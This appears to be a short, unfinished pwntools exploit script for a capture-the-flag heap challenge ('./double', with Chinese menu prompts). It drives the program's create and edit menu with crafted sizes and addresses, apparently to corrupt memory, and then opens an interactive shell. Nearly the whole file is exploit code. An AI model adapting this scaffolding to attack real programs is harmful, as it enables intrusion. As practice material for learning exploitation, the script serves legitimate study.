from pwn import *
p=process('./double')
context.log_level='debug'
# gdb.attach(p,'b *0x0000000000400BE5')
pause()

0x6020E0
0x6024e0

def create(index,size):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'1')
    p.recvuntil(str('请输入序号：').encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入大小：').encode())
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'4')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入编辑内容：').encode())
    p.sendline(str(content).encode())

def quit_():
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'5')

create(66,0x15CC15CC)
create(260,0x602228)

# create(82,0xCC51CC51)
# quit_()
# create(65,0x15CC15CC)
p.interactive()